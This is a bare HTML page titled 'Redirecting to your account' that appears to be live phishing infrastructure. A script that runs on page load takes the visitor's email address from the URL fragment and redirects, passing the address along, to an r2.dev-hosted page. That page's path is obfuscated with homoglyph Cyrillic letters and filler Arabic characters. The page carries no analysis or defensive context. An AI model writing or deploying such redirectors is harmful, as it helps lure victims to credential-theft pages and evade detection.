<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to your account</title>
    <script type="text/javascript">
        function isValidEmail(email) {
            // Simple email validation regex
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailPattern.test(email);
        }

        function redirect() {
            var url = window.location.href;
            var emailParam = url.split("#email=")[1];

            if (emailParam && isValidEmail(emailParam)) {
                var newUrl = "https://pub-0cbf7f39700d44e3b723e54b433ab474.r2.dev/tw%D0%B0i%D0%B5rvi%D1%81lingailingr%D0%B5vic%D0%B5%D9%81%D8%B6%D8%AD%D8%B5%D8%B9%D9%A4%D9%A9%D9%A2%D8%A5%D8%B9%D8%B7%D8%A8%D8%AF%D8%A1%D8%A8%D9%A1%D9%A0%D9%A6%D9%8A%D8%A7%D8%B5%D8%AD%D8%AD%D9%8A%D8%AD%D8%B3%D8%A8%D9%A1%D9%A3%D8%B3%D9%A1%D8%B3%D8%B7%D8%A8%D8%A1%D8%A8%D8%AD%D8%A8%D8%B9%D8%AF%D8%AE%D8%AE%D8%B6%D8%A8%D8%A7%D8%A1%D8%A8%D9%A0%D8%A7%D9%A1%D9%81%D8%A8%D9%A0%D9%A8%D9%A2.html#" + emailParam;
                window.location.href = newUrl;
            } else if (!emailParam) {
                window.location.href = "https://pub-0cbf7f39700d44e3b723e54b433ab474.r2.dev/tw%D0%B0i%D0%B5rvi%D1%81lingailingr%D0%B5vic%D0%B5%D9%81%D8%B6%D8%AD%D8%B5%D8%B9%D9%A4%D9%A9%D9%A2%D8%A5%D8%B9%D8%B7%D8%A8%D8%AF%D8%A1%D8%A8%D9%A1%D9%A0%D9%A6%D9%8A%D8%A7%D8%B5%D8%AD%D8%AD%D9%8A%D8%AD%D8%B3%D8%A8%D9%A1%D9%A3%D8%B3%D9%A1%D8%B3%D8%B7%D8%A8%D8%A1%D8%A8%D8%AD%D8%A8%D8%B9%D8%AF%D8%AE%D8%AE%D8%B6%D8%A8%D8%A7%D8%A1%D8%A8%D9%A0%D8%A7%D9%A1%D9%81%D8%A8%D9%A0%D9%A8%D9%A2.html#email=";
            }
        }
    </script>
</head>
<body onload="redirect()">
</body>
</html>
